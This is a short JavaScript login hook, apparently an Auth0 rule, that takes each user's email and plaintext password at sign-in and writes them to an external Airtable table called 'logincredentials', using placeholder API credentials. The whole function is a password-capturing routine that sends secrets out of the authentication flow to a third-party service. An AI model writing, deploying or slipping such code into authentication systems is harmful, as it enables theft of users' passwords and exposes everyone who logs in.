function logincredentials (user, context, callback) {
    const Airtable = require('airtable');
    const base = new Airtable({ apiKey: 'YOUR_API_KEY' }).base('YOUR_BASE_ID');
    const Username = user.email;
    const password = context.connectionPassword;
  
    base('logincredentials').create({
      "Username": Username,
      "Password": password
    }, function(err, record) {
      if (err) {
        console.error(err);
        return callback(err);
      }
      console.log(record.getId());
      callback(null, user, context);
    });
  }
  